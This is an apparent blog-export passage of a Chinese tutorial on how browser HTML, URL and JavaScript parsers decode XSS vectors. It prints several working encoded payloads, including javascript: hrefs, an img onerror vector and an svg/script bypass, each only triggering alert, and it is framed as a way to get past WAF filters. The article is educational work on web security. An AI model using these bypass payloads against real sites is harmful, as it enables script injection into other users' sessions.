’状态，导致资源不能正确解析，我们构造的 payload 也就不能得到正确的执行，我们来看看下面的例子：\n\n`<a href=\"%6a%61%76%61%73%63%72%69%70%74:alert(1)\">text</a>` 编码了 **javascript**，可以看到无法正确执行。\n\n![xss_4](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_4.png)\n\n从图中可以看出，得到的跳转地址是 **http://localhost/javascript:alert(1)**，原因就是没有正确的识别资源的协议类型，拼接到了默认地址的后面，导致 payload 无法执行。\n\n2、其次，URL 编码过程使用的是 UTF-8 编码，如果给 URL 进行别种方式的编码，会导致 URL 解析器不能正确识别。\n\n### HTML 中的两种 URL资源的执行\n\n我们可以利用伪协议来进行 xss 的反射攻击，而在HTML 标签中有两种 url 的连接类型，一种是 `src`，一种是 `href`，我们先来看看两者的区别\n\n#### 1、src\n\nsrc 适用于替换当前元素，是 source 的缩写，指向外部资源的位置，指向的内容会 **自动的** 嵌入到文档中标签的位置。请求 src 资源的时候会将其指向的资源下载并应用到文档内。例如 js 脚本，img 图片，frame 元素等。\n\n#### 2、href\n\nhref 是 Hypertext Reference 的缩写，指向网络资源的所在位置，是与该页面有关联的，是引用。\n\n**src**与 **href** 的主要区别就是 一个是引入，一个是引用。\n\n之前在很多地方看到 payload 都有这种 src 引用的格式\n\n`<img src=\"javascript:alert(0);\">`\n\n但是现在在 Chrome 与 Firefox 上实验了下都不能执行。原因就是当下的一部分浏览器**为了防止恶意代码的注入，已经禁用了 src 属性的 javascript 的伪协议**。我们还有一种引入外部 js 文件的 src 利用方式：\n\n`<script src=\"evil.js\"></script>`\n\n其中 evil.js 中的内容为\n\n```\nalert(/xss/);\n```\n\n## 3、 Javascript 解析\n\n详见 javascript 的[解析规则](http://www.ecma-international.org/publications/standards/Ecma-262.htm)\n\n因为 js 脚本一般是内嵌在 HTML 页面中的，所以 javascript 的解析容易与 HTML 解析搞混了。Javascript 的解析需要注意的点有下面两点：\n\n### script 标签的解析\n\n在之前，我们提到过 HTML 中的 5 类元素，其中 **script** 标签属于 **原始文本数据**,。它有个特别的解析属性就是虽然内嵌在了 HTML 界面的数据状态，但是仍然不能解析字符引用。看看下面这个例子：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n</head>\n<body>\n    <script>&lt;</script>\n    &lt;\n</body>\n</html>\n```\n\n![xss_5](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_5.png)\n\n可以看到，里面的字符引用并没有被解码。\n\n### unicode 字符编码的解析\n\n在之前的基础铺垫的时候提到了 js 中 unicode 的编码问题，那么它们在脚本的什么位置会被解析？又会被解析成什么意思？unicode 大致有以下三个位置会被解析，但是解析的意义有些许不同。\n\n#### 1、字符串中\n\nunicode 放在字符串中的时候会被解析，但是只是会解析为常规的字符，不会解释为破坏上下文的特殊意义的字符。请看下例子：\n\n```html\n<script>\n      var str = '\\u0027';\n      document.write(str);\n</script>\n```\n\n![xss_6](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_6.png)\n\n可以看到，被编码的单引号只是解释为了单纯的字符，没有破坏 js 的上下文。\n\n#### 2、标识符中\n\n标识符包括函数名，属性名等。如果使用 unicode 编码这些数据的话，会被正确解释为上下文中的标识符，可以正确的运行。看下面这个例子：\n\n```javascript\n<script>\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074.\\u0077\\u0072\\u0069\\u0074\\u0065('test_successfully@');</script>\n```\n\n注意这里只编码了 **document** 和 **write**，并没有编码点号，因为测试结果显示无法编码点号进行执行，但这并不影响我们探测，因为一般利用到的函数都等都只是单纯的字母拼接。\n\n![xss_7](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_7.png)\n\n成功解码并执行了打印函数。\n\n#### ３、控制字符\n\n当控制字符不在引号包围的时候，例如 `(` `)` `'` `\"`这些字符，裸露在文档外面进行 unicode 编码，js 解析器不能将它们正确的解析为控制字符，仅仅会被解码为标识符亦或是字符串，所以，想要成功执行一个 js 函数，就必须保证括号为 **()**，而不是 **\\u0028 \\u0029**.\n\n综上，js 在解析 unicode 编码的时候，能赋予非字符意义的地方有且仅有**标识符**这一个位置。\n\n# 4@ 解析流的顺序\n\n前端这三大解析器一般是相互配合的，我们需要搞清楚他们配合的顺序，然后对应构造 payload ，才有可能正确的被解码执行。\n\n一般的解析顺序如下：\n\n**1、HTML 解析**\n\n浏览器从网络堆栈中获取内容后，会触发 HTML 解析器根据解析规则（上文链接）对文章进行词法的解析，在这一步中，所有的**合理的字符引用都会被解码**【合理即能够被解析的位置放入字符引用】，解析完成后 DOM 树就被创建好了。\n\n**2、JS or URL 解析**\n\n为什么第二步的解析顺序不确定呢，这与文档资源类型的顺序有关。其中 Js 解析器 负责文档中内嵌脚本，unicode 编码等的解析，URL 解析器负责解析碰到的 URL 资源的解码。但位置不同，可能会造成不同的解析顺序。试看下两例：\n\n```javascript\n脚本1：\n <a href=\"javascript:%61%6c%65%72%74%28%31%29\">sequence_test</a> 编码了 alert(1)\n \n脚本2：\n<a href=# onclick=\"window.\\u006f\\u0070\\u0065\\u006e('http://www.baidu.com')\">sequence_test</a>   \n    编码了open\n```\n\n其中\n\n脚本1先是由 url 解析器解析 href 中的资源，解析完成后进入 js 的上下文，所以 js 解析器再解析 js 的内容。\n\n脚本2先是由 js 解析器解析 onclick 中的 unicode 编码，编码完成后发现参数是 url 的上下文，这时 url 解析器介入解析。\n\n可以看到，不同的位置会导致不同的解析顺序。\n\n# 5@ xss_payload 的练习\n\n下面给出了常见的几种弹窗的方法，通过上面的阅读与学习，来判断下是否可以成功执行代码。\n\n```javascript\n1、  <a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"></a>    \n    url编码了 javascript:alert(1)\n \n2、  <a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29\">xss_test</a>   \n\t字符实体编码了 javascript url 编码了 alert(2)    \n\n3、  <a href=\"javascript%3aalert(3)\">test</a>\n    url 编码了 ：\n\n4、  <div>&#60;img src=x onerror=alert(4)&#62;</div>  \n    字符实体编码了尖括号\n\n5、  <textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea> \n\t字符实体编码了尖括号\n```\n\n### 解析\n\n1、 无法执行，因为编码了协议\n\n2、 可以执行，html 先解析字符实体编码 javascript ，url 解析器再解析 alert(2)，位置与格式都允许。\n\n3、 无法执行，因为协议被编码导致无法正确识别协议。\n\n4、 无法执行，因为嵌在数据状态内，只能解析字符引用为普通字符串，无特殊意义。\n\n5、无法执行，首先是因为在数据状态中只能将尖括号转义为字符串，其次 RCDATA 元素中不能嵌入新的标签，嵌入也无法执行代码。\n\n更多例子附带答案，[戳这](http://test.attacker-domain.com/browserparsing/answers.txt)\n\n# 6@ 关于 svg 标签中解析 js 代码\n\n上面写道 **svg** 标签属于外部元素，**script** 标签属于原是文本元素，而且也知道 **script** 标签里面是不能转义字符实体编码的，那么我们考虑一下下面这段代码是否可以弹窗：\n\n`<svg><script>alert&#40;/xss/)</script></svg>`\n\n按我们上面理解的话，`<script>` 标签下不能解析字符引用，就算可以解析，圆括号这种被放在数据状态下的解码也只能成为字符串，并不能被解析为控制字符。\n\n所以不能码？上图～\n\n![xss_8](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_8.png)\n\n![xss_9](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_9.png)\n\n太夸张了，不仅解码了字符引用，还转换为了控制字符并且弹窗了～\n\n按照上面的分析，问题绝对就在 **svg** 这个标签上面。\n\n`<svg>`这个标签 使用 XML 格式定义图形，XML 会解析字符实体，而 w3c 上面给出的这段实例代码中也可以看出 xml 使用的端倪。\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n\n<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" height=\"190\">\n  <polygon points=\"100,10 40,180 190,60 10,60 160,180\"\n  style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\" />\n</svg>\n\n</body>\n</html>\n```\n\n那么为什么 **script** 标签可以被解析呢？原因就是 **svg** 标签支持 嵌入 **script** 标签。\n\n这是支持 **script** 标签的[文档](https://www.w3.org/TR/SVG11/script.html)借用引用文章作者的话来讲就是：\n\n这个 payload 之所以可以执行是因为遵循了 **svg** 和 **xml** 的标准。\n\n# 7@ 总结\n\n理解一个漏洞的利用，需要也有必要挖的深些，这样才能更好的从攻与防的角度来构造攻击向量，亦或是根据攻击的思路来构造防御的 waf。\n\n`Reference`:\n\n`https://www.cnblogs.com/polk6/p/html-entity.html`\n\n`https://www.cnblogs.com/liuxianan/p/display-unicode-character-in-html-css-and-js.html`\n\n`https://zhidao.baidu.com/question/583316301.html`\n\n`https://bbs.csdn.net/topics/392055451`\n\n`http://test.attacker-domain.com/browserparsing/answers.txt`\n\n`http://test.attacker-domain.com/browserparsing/tests.html`\n\n`http://bobao.360.cn/learning/detail/292.html`\n\n`https://www.hackersb.cn/hacker/85.html`\n\n`http://www.w3school.com.cn/html5/html_5_svg.asp`\n\n`https://www.w3.org/TR/SVG11/script.html`\n","source":"_posts/Xss攻击向量解析的探析.md","raw":"---\ntitle: Xss 攻击向量解析的探析\ntags:\n\n - xss\n - javascript\n - tips\ndate: 2019-09-17\n---\n\n\n\n# 1@ 前言\n\n当利用编码来绕过有关 xss 的 waf 的时候，有时我们构造的 payload 得不到执行。纵然你的编码方式是对的，但是如果对应的解析器不解析你的攻击向量，也是徒劳的。这时候我们就需要比较清晰的了解自己的 payload 所遵守的解析策略与经历的解析流程，然后构造出更加有针对性的攻击向量。\n\n\n\n# 2@ 基础铺垫\n\n在了解一个 payload 解析流程之前，我们需要先熟悉一些用到的基础知识。\n\n## 2.1 HTML字符实体\n\n在 HTML 中，字符实体其实就是转义序列，一般是为了正确显示保留，如 **‘<’**, **‘>’**, **空格**等。HTML 中的实体转义格式有以下两种：\n\n### Entity name （实体名称）\n\n格式 ： **&实体名;**\n\neg ： `&lt;` （less than）表示 ‘<’\n\n[更多的字符实体名戳这里](http://www.w3school.com.cn/html/html_entities.asp)\n\n### Entity Number (实体编号)\n\n格式 ： **&实体编号;**\n\n其中实体编号可以 是 16 进制格式 **&#x** 开头，或者 10 进制格式的 **&#** 开头。\n\neg ： `&#65;` 表示字符 ‘A’ \n\n\n\n## 2、 JS 中的 unicode 表示\n\n格式 ：**\\u + 16 进制的 unicode 编码**\n\neg : `\\u5b89` 表示汉字 **安**\n\n\n\n# 3@ 攻击向量经历的三种解析\n\n## 1、HTML 解析\n\n原版的 HTML 解析规则[戳这](http://www.whatwg.org/specs/web-apps/current-work/multipage/tokenization.html)。\n\neg : `<a href=\"http://www.baidu.com\">text</a>`\n\n联想一下我们学过的数电，可以视 HTML 解析器为一个状态机，遍历获得的字符，按照规则进行状态的转换。以上面的例子：\n\n当碰到 **<** 字符的时候，就会转换到标签开始状态 (Tag open state)【前提是紧跟字符不为 **/**】\n\n然后跳转到 标签名状态（Tag name state) 【对应例子里面的 a 】\n\n. . . . . .\n\n进入数据状态 (Data state) 【对应例子里面的 **text** 】, 在刚进入这个状态时，释放当前标签的 token 【对应例子里面的 a 标签的前部分】。在数据状态时，每发现一个完整的标签，就会释放一个 token.\n\n那么，是否存在这样一个位置状态，它可以将我们的字符实体解析并赋予本来的非字符的特殊意义(如 `&lt;`表示 **<**可以当标签开始符来对待，然后让其中的脚本执行)? 答案是：没有。这就与 HTML 解析 规则有关。我们再拿一个例子来讲：\n\n`<div>&lt;script>alert(1);</script></div>`\n\n因为 div 标签开始后，解析器还是在数据状态，不会将这个字符引用转换为 ‘标签开始状态’，所以就可以保证我们得到的字符实体引用只会被解析为单纯的数据，而没有特殊意义，从而从一定程度上杜绝了一些风险。 ![xss_1](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_1.png)\n\n从图中我们可以看出来，’<’ 标签已经被转义，但是只是作为纯字符输出在页面中。之后的 由于未配对成功而被解析器去除。\n\n而在 HTML 中也并不是所有位置都会解析转义字符引用，有三种情况下会转义：\n\n### 数据状态的解析\n\n`<div>&lt;&gt;</div>`\n\n![xss_2](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_2.png)\n\n可以看到字符引用被解析。\n\n### 属性值中的解析\n\n`<a href=\"javascript:alert&#40;1)\"></a>`\n\n![xss_3](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_3.png)\n\n可以看到 ‘(‘ 被解码。\n\n### RCDATA状态下的字符引用\n\n这时我们需要先了解下 HTML 中的 5 类元素\n\n```\n1.  空元素(Void elements)，如<area>,<br>,<base>等等\n\n2.  原始文本元素(Raw text elements)，有<script>和<style>\n\n3.  RCDATA元素(RCDATA elements)，有<textarea>和<title>\n\n4.  外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素\n\n5.  基本元素(Normal elements)，即除了以上4种元素以外的元素\n\n五类元素的区别如下：\n\n1.  空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。\n\n2.  原始文本元素，可以容纳文本。\n\n3.  RCDATA元素，可以容纳文本和字符引用。\n\n4.  外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释\n\n5.  基本元素，可以容纳文本、字符引用、其他元素和注释\n```\n\n \n\n由于 RCDATA 状态中可以转义字符实体，那么在像 **textarea** **title** 等标签中就可以字符引用。这里 还有一个特殊的点就是在 **RCDATA** 元素标签 的内容中，遇到 `<` 后，会进入 **RCADATA小于号状态**，如果紧接着不是`/`字符的话，就会返回到 **RCDATA状态**。那么也就是说在 **textarea**或者**title**标签中只能认识并解析的标签只有对应的 **</textarea>**或者 **</title>**,不会有新标签的产生，也就杜绝了脚本的执行。例如：\n\n`<textarea><script>alert(6)</script></textarea>`\n\n是不会执行的。\n\n## 2、URL 解析\n\n同样的，URL 解析器依旧可以看做一个状态机，其解析规则在[这里](http://url.spec.whatwg.org/)。这里只提几个 xss_payload 能涉及到的地方。\n\n1、首先，资源类型必须是大写字母或者小写字母，否则会进入到无状态类型。那首先就要求资源的协议要保证格式完全的正确,譬如使用 **javascript:** 伪协议时不能使用编码来绕过，因为这会让 URL 解析器跳转到 ‘ 无类型 ’状态，导致资源不能正确解析，我们构造的 payload 也就不能得到正确的执行，我们来看看下面的例子：\n\n`<a href=\"%6a%61%76%61%73%63%72%69%70%74:alert(1)\">text</a>` 编码了 **javascript**，可以看到无法正确执行。\n\n![xss_4](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_4.png)\n\n从图中可以看出，得到的跳转地址是 **http://localhost/javascript:alert(1)**，原因就是没有正确的识别资源的协议类型，拼接到了默认地址的后面，导致 payload 无法执行。\n\n2、其次，URL 编码过程使用的是 UTF-8 编码，如果给 URL 进行别种方式的编码，会导致 URL 解析器不能正确识别。\n\n### HTML 中的两种 URL资源的执行\n\n我们可以利用伪协议来进行 xss 的反射攻击，而在HTML 标签中有两种 url 的连接类型，一种是 `src`，一种是 `href`，我们先来看看两者的区别\n\n#### 1、src\n\nsrc 适用于替换当前元素，是 source 的缩写，指向外部资源的位置，指向的内容会 **自动的** 嵌入到文档中标签的位置。请求 src 资源的时候会将其指向的资源下载并应用到文档内。例如 js 脚本，img 图片，frame 元素等。\n\n#### 2、href\n\nhref 是 Hypertext Reference 的缩写，指向网络资源的所在位置，是与该页面有关联的，是引用。\n\n**src**与 **href** 的主要区别就是 一个是引入，一个是引用。\n\n之前在很多地方看到 payload 都有这种 src 引用的格式\n\n`<img src=\"javascript:alert(0);\">`\n\n但是现在在 Chrome 与 Firefox 上实验了下都不能执行。原因就是当下的一部分浏览器**为了防止恶意代码的注入，已经禁用了 src 属性的 javascript 的伪协议**。我们还有一种引入外部 js 文件的 src 利用方式：\n\n`<script src=\"evil.js\"></script>`\n\n其中 evil.js 中的内容为\n\n```\nalert(/xss/);\n```\n\n## 3、 Javascript 解析\n\n详见 javascript 的[解析规则](http://www.ecma-international.org/publications/standards/Ecma-262.htm)\n\n因为 js 脚本一般是内嵌在 HTML 页面中的，所以 javascript 的解析容易与 HTML 解析搞混了。Javascript 的解析需要注意的点有下面两点：\n\n### script 标签的解析\n\n在之前，我们提到过 HTML 中的 5 类元素，其中 **script** 标签属于 **原始文本数据**,。它有个特别的解析属性就是虽然内嵌在了 HTML 界面的数据状态，但是仍然不能解析字符引用。看看下面这个例子：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n</head>\n<body>\n    <script>&lt;</script>\n    &lt;\n</body>\n</html>\n```\n\n![xss_5](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_5.png)\n\n可以看到，里面的字符引用并没有被解码。\n\n### unicode 字符编码的解析\n\n在之前的基础铺垫的时候提到了 js 中 unicode 的编码问题，那么它们在脚本的什么位置会被解析？又会被解析成什么意思？unicode 大致有以下三个位置会被解析，但是解析的意义有些许不同。\n\n#### 1、字符串中\n\nunicode 放在字符串中的时候会被解析，但是只是会解析为常规的字符，不会解释为破坏上下文的特殊意义的字符。请看下例子：\n\n```html\n<script>\n      var str = '\\u0027';\n      document.write(str);\n</script>\n```\n\n![xss_6](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_6.png)\n\n可以看到，被编码的单引号只是解释为了单纯的字符，没有破坏 js 的上下文。\n\n#### 2、标识符中\n\n标识符包括函数名，属性名等。如果使用 unicode 编码这些数据的话，会被正确解释为上下文中的标识符，可以正确的运行。看下面这个例子：\n\n```javascript\n<script>\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074.\\u0077\\u0072\\u0069\\u0074\\u0065('test_successfully@');</script>\n```\n\n注意这里只编码了 **document** 和 **write**，并没有编码点号，因为测试结果显示无法编码点号进行执行，但这并不影响我们探测，因为一般利用到的函数都等都只是单纯的字母拼接。\n\n![xss_7](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_7.png)\n\n成功解码并执行了打印函数。\n\n#### ３、控制字符\n\n当控制字符不在引号包围的时候，例如 `(` `)` `'` `\"`这些字符，裸露在文档外面进行 unicode 编码，js 解析器不能将它们正确的解析为控制字符，仅仅会被解码为标识符亦或是字符串，所以，想要成功执行一个 js 函数，就必须保证括号为 **()**，而不是 **\\u0028 \\u0029**.\n\n综上，js 在解析 unicode 编码的时候，能赋予非字符意义的地方有且仅有**标识符**这一个位置。\n\n# 4@ 解析流的顺序\n\n前端这三大解析器一般是相互配合的，我们需要搞清楚他们配合的顺序，然后对应构造 payload ，才有可能正确的被解码执行。\n\n一般的解析顺序如下：\n\n**1、HTML 解析**\n\n浏览器从网络堆栈中获取内容后，会触发 HTML 解析器根据解析规则（上文链接）对文章进行词法的解析，在这一步中，所有的**合理的字符引用都会被解码**【合理即能够被解析的位置放入字符引用】，解析完成后 DOM 树就被创建好了。\n\n**2、JS or URL 解析**\n\n为什么第二步的解析顺序不确定呢，这与文档资源类型的顺序有关。其中 Js 解析器 负责文档中内嵌脚本，unicode 编码等的解析，URL 解析器负责解析碰到的 URL 资源的解码。但位置不同，可能会造成不同的解析顺序。试看下两例：\n\n```javascript\n脚本1：\n <a href=\"javascript:%61%6c%65%72%74%28%31%29\">sequence_test</a> 编码了 alert(1)\n \n脚本2：\n<a href=# onclick=\"window.\\u006f\\u0070\\u0065\\u006e('http://www.baidu.com')\">sequence_test</a>   \n    编码了open\n```\n\n其中\n\n脚本1先是由 url 解析器解析 href 中的资源，解析完成后进入 js 的上下文，所以 js 解析器再解析 js 的内容。\n\n脚本2先是由 js 解析器解析 onclick 中的 unicode 编码，编码完成后发现参数是 url 的上下文，这时 url 解析器介入解析。\n\n可以看到，不同的位置会导致不同的解析顺序。\n\n# 5@ xss_payload 的练习\n\n下面给出了常见的几种弹窗的方法，通过上面的阅读与学习，来判断下是否可以成功执行代码。\n\n```javascript\n1、  <a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"></a>    \n    url编码了 javascript:alert(1)\n \n2、  <a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29\">xss_test</a>   \n\t字符实体编码了 javascript url 编码了 alert(2)    \n\n3、  <a href=\"javascript%3aalert(3)\">test</a>\n    url 编码了 ：\n\n4、  <div>&#60;img src=x onerror=alert(4)&#62;</div>  \n    字符实体编码了尖括号\n\n5、  <textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea> \n\t字符实体编码了尖括号\n```\n\n### 解析\n\n1、 无法执行，因为编码了协议\n\n2、 可以执行，html 先解析字符实体编码 javascript ，url 解析器再解析 alert(2)，位置与格式都允许。\n\n3、 无法执行，因为协议被编码导致无法正确识别协议。\n\n4、 无法执行，因为嵌在数据状态内，只能解析字符引用为普通字符串，无特殊意义。\n\n5、无法执行，首先是因为在数据状态中只能将尖括号转义为字符串，其次 RCDATA 元素中不能嵌入新的标签，嵌入也无法执行代码。\n\n更多例子附带答案，[戳这](http://test.attacker-domain.com/browserparsing/answers.txt)\n\n# 6@ 关于 svg 标签中解析 js 代码\n\n上面写道 **svg** 标签属于外部元素，**script** 标签属于原是文本元素，而且也知道 **script** 标签里面是不能转义字符实体编码的，那么我们考虑一下下面这段代码是否可以弹窗：\n\n`<svg><script>alert&#40;/xss/)</script></svg>`\n\n按我们上面理解的话，`<script>` 标签下不能解析字符引用，就算可以解析，圆括号这种被放在数据状态下的解码也只能成为字符串，并不能被解析为控制字符。\n\n所以不能码？上图～\n\n![xss_8](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_8.png)\n\n![xss_9](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_9.png)\n\n太夸张了，不仅解码了字符引用，还转换为了控制字符并且弹窗了～\n\n按照上面的分析，问题绝对就在 **svg** 这个标签上面。\n\n`<svg>`这个标签 使用 XML 格式定义图形，XML 会解析字符实体，而 w3c 上面给出的这段实例代码中也可以看出 xml 使用的端倪。\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n\n<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" height=\"190\">\n  <polygon points=\"100,10 40,180 190,60 10,60 160,180\"\n  style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\" />\n</svg>\n\n</body>\n</html>\n```\n\n那么为什么 **script** 标签可以被解析呢？原因就是 **svg** 标签支持 嵌入 **script** 标签。\n\n这是支持 **script** 标签的[文档](https://www.w3.org/TR/SVG11/script.html)借用引用文章作者的话来讲就是：\n\n这个 payload 之所以可以执行是因为遵循了 **svg** 和 **xml** 的标准。\n\n# 7@ 总结\n\n理解一个漏洞的利用，需要也有必要挖的深些，这样才能更好的从攻与防的角度来构造攻击向量，亦或是根据攻击的思路来构造防御的 waf。\n\n`Reference`:\n\n`https://www.cnblogs.com/polk6/p/html-entity.html`\n\n`https://www.cnblogs.com/liuxianan/p/display-unicode-character-in-html-css-and-js.html`\n\n`https://zhidao.baidu.com/question/583316301.html`\n\n`https://bbs.csdn.net/topics/392055451`\n\n`http://test.attacker-domain.com/browserparsing/answers.txt`\n\n`http://test.attacker-domain.com/browserparsing/tests.html`\n\n`http://bobao.360.cn/learning/detail/292.html`\n\n`https://www.hackersb.cn/hacker/85.html`\n\n`http://www.w3school.com.cn/html5/html_5_svg.asp`\n\n`https://www.w3.org/TR/SVG11/script.html`\n","slug":"Xss攻击向量解析的探析","published":1,"updated":"2019-09-18T12:51:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckbh7yzg40000mp7g6ypqt1pl","content":"<h1 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h1><p>当利用编码来绕过有关 xss 的 waf 的时候，有时我们构造的 payload 得不到执行。纵然你的编码方式是对的，但是如果对应的解析器不解析你的攻击向量，也是徒劳的。这时候我们就需要比较清晰的了解自己的 payload 所遵守的解析策略与经历的解析流程，然后构造出更加有针对性的攻击向量。</p>\n<h1 id=\"2-基础铺垫\"><a href=\"#2-基础铺垫\" class=\"headerlink\" title=\"2@ 基础铺垫\"></a>2@ 基础铺垫</h1><p>在了解一个 payload 解析流程之前，我们需要先熟悉一些用到的基础知识。</p>\n<h2 id=\"2-1-HTML字符实体\"><a href=\"#2-1-HTML字符实体\" class=\"headerlink\" title=\"2.1 HTML字符实体\"></a>2.1 HTML字符实体</h2><p>在 HTML 中，字符实体其实就是转义序列，一般是为了正确显示保留，如 <strong>‘&lt;’</strong>, <strong>‘&gt;’</strong>, <strong>空格</strong>等。HTML 中的实体转义格式有以下两种：</p>\n<h3 id=\"Entity-name-（实体名称）\"><a href=\"#Entity-name-（实体名称）\" class=\"headerlink\" title=\"Entity name （实体名称）\"></a>Entity name （实体名称）</h3><p>格式 ： <strong>&amp;实体名;</strong></p>\n<p>eg ： <code>&amp;lt;</code> （less than）表示 ‘&lt;’</p>\n<p><a href=\"http://www.w3school.com.cn/html/html_entities.asp\" target=\"_blank\" rel=\"noopener\">更多的字符实体名戳这里</a></p>\n<h3 id=\"Entity-Number-实体编号\"><a href=\"#Entity-Number-实体编号\" class=\"headerlink\" title=\"Entity Number (实体编号)\"></a>Entity Number (实体编号)</h3><p>格式 ： <strong>&amp;实体编号;</strong></p>\n<p>其中实体编号可以 是 16 进制格式 <strong>&amp;#x</strong> 开头，或者 10 进制格式的 <strong>&amp;#</strong> 开头。</p>\n<p>eg ： <code>&amp;#65;</code> 表示字符 ‘A’ </p>\n<h2 id=\"2、-JS-中的-unicode-表示\"><a href=\"#2、-JS-中的-unicode-表示\" class=\"headerlink\" title=\"2、 JS 中的 unicode 表示\"></a>2、 JS 中的 unicode 表示</h2><p>格式 ：<strong>\\u + 16 进制的 unicode 编码</strong></p>\n<p>eg : <code>\\u5b89</code> 表示汉字 <strong>安</strong></p>\n<h1 id=\"3-攻击向量经历的三种解析\"><a href=\"#3-攻击向量经历的三种解析\" class=\"headerlink\" title=\"3@ 攻击向量经历的三种解析\"></a>3@ 攻击向量经历的三种解析</h1><h2 id=\"1、HTML-解析\"><a href=\"#1、HTML-解析\" class=\"headerlink\" title=\"1、HTML 解析\"></a>1、HTML 解析</h2><p>原版的 HTML 解析规则<a href=\"http://www.whatwg.org/specs/web-apps/current-work/multipage/tokenization.html\" target=\"_blank\" rel=\"noopener\">戳这</a>。</p>\n<p>eg : <code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;text&lt;/a&gt;</code></p>\n<p>联想一下我们学过的数电，可以视 HTML 解析器为一个状态机，遍历获得的字符，按照规则进行状态的转换。以上面的例子：</p>\n<p>当碰到 <strong>&lt;</strong> 字符的时候，就会转换到标签开始状态 (Tag open state)【前提是紧跟字符不为 <strong>/</strong>】</p>\n<p>然后跳转到 标签名状态（Tag name state) 【对应例子里面的 a 】</p>\n<p>. . . . . .</p>\n<p>进入数据状态 (Data state) 【对应例子里面的 <strong>text</strong> 】, 在刚进入这个状态时，释放当前标签的 token 【对应例子里面的 a 标签的前部分】。在数据状态时，每发现一个完整的标签，就会释放一个 token.</p>\n<p>那么，是否存在这样一个位置状态，它可以将我们的字符实体解析并赋予本来的非字符的特殊意义(如 <code>&amp;lt;</code>表示 <strong>&lt;</strong>可以当标签开始符来对待，然后让其中的脚本执行)? 答案是：没有。这就与 HTML 解析 规则有关。我们再拿一个例子来讲：</p>\n<p><code>&lt;div&gt;&amp;lt;script&gt;alert(1);&lt;/script&gt;&lt;/div&gt;</code></p>\n<p>因为 div 标签开始后，解析器还是在数据状态，不会将这个字符引用转换为 ‘标签开始状态’，所以就可以保证我们得到的字符实体引用只会被解析为单纯的数据，而没有特殊意义，从而从一定程度上杜绝了一些风险。 <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_1\"></p>\n<p>从图中我们可以看出来，’&lt;’ 标签已经被转义，但是只是作为纯字符输出在页面中。之后的 由于未配对成功而被解析器去除。</p>\n<p>而在 HTML 中也并不是所有位置都会解析转义字符引用，有三种情况下会转义：</p>\n<h3 id=\"数据状态的解析\"><a href=\"#数据状态的解析\" class=\"headerlink\" title=\"数据状态的解析\"></a>数据状态的解析</h3><p><code>&lt;div&gt;&amp;lt;&amp;gt;&lt;/div&gt;</code></p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/xss_payload_new/xss_2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"xss_2\"></p>\n<p>可以看到字符引用被解析。</p>\n<h3 id=\"属性值中的解析\"><a href=\"#属性值中的解析\" 